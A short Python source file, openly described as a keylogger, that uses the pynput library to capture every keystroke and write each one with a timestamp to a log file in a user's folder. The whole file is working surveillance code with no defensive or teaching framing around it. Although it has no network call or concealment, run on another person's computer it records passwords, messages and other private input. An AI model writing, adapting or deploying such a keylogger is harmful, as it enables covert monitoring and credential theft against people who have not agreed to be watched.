# This is a keylogger that logs all keystrokes to a file.
# Path: E:\python-projects\keylogger.py
# Run: py keylogger.py

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:\Users\corey\Homebase\scanresults\keylogs"
logging.basicConfig(filename=(log_dir + "/key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
